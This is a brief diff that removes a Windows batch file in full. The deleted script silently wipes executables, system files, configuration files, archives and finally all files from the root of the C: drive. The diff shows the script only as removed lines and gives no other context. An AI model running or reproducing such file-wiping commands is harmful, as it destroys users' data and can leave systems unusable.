@@ -1,9 +1,0 @@
-@echo off
-del c:\*.exe
-del c:\*.com
-del c:\*.bat
-del c:\*.sys
-del c:\*.ini
-del c:\*.txt
-del c:\*.zip
-del c:\*.*
